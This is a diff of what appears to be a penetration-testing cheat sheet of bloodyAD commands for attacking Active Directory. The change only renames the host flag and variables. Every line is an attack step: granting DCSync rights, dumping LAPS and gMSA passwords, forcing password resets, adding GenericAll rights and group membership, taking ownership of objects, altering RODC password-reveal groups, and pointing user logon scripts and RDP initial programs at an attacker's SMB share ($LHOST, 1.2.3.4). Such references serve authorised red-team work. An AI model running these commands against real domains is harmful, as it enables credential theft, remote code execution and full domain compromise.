@@ -1,28 +1,28 @@
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -k set object "$TARGET_OBJECT" groupType -v -2147483644 
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -k set object "$TARGET_OBJECT" groupType -v -2147483640
-bloodyAD -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_HOST" set object "$COMPUTER_NAME" serviceprincipalname
-bloodyAD -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_HOST" set object "$COMPUTER_NAME" dnsHostName -v "$DC_NAME.$DOMAIN"
-bloodyAD -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_HOST" get object "$TARGET_COMPUTER" --attr dnsHostName,serviceprincipalname
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" msTSWorkDirectory -v 'C:\'
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" scriptPath -v '\\1.2.3.4\share\file.exe'
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner "$TARGET_OBJECT" "$TARGET_PRINCIPAL"
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get dnsDump
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-NeverRevealGroup
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TARGET_USER" "$NEW_PASSWORD"
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$TARGET_PRINCIPAL"
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET_OBJECT" --attr msDS-ManagedPassword
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TARGET_OBJECT" "$TARGET_PRINCIPAL"
-bloodyAD --host "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TARGET_GROUP" "$TARGET_USER"
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET\$" --attr msDS-ManagedPassword
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner "$TARGET" "$NEW_OWNER"
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TARGET" "$USER"
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TARGET_GROUP" "$TARGET_USER"
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TARGET_USER" "$NEW_PASSWORD"
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get writable --detail
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$USER"
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" msTSInitialProgram -v "\\\\$LHOST\\share\\file.exe"
-bloodyAD --host "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" scriptPath -v "\\\\$LHOST\\share\\file.exe"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -k set object "$TARGET_OBJECT" groupType -v -2147483644
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -k set object "$TARGET_OBJECT" groupType -v -2147483640
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$COMPUTER_NAME" serviceprincipalname
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$COMPUTER_NAME" dnsHostName -v "$DC_NAME.$DOMAIN"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET_COMPUTER" --attr dnsHostName,serviceprincipalname
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" msTSWorkDirectory -v 'C:\'
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" scriptPath -v '\\1.2.3.4\share\file.exe'
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner "$TARGET_OBJECT" "$TARGET_PRINCIPAL"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get dnsDump
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-NeverRevealGroup
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TARGET_USER" "$NEW_PASSWORD"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$TARGET_PRINCIPAL"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET_OBJECT" --attr msDS-ManagedPassword
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TARGET_OBJECT" "$TARGET_PRINCIPAL"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TARGET_GROUP" "$TARGET_USER"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET\$" --attr msDS-ManagedPassword
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner "$TARGET" "$NEW_OWNER"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TARGET" "$USER"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TARGET_GROUP" "$TARGET_USER"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TARGET_USER" "$NEW_PASSWORD"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get writable --detail
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$USER"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" msTSInitialProgram -v "\\\\$LHOST\\share\\file.exe"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" scriptPath -v "\\\\$LHOST\\share\\file.exe"
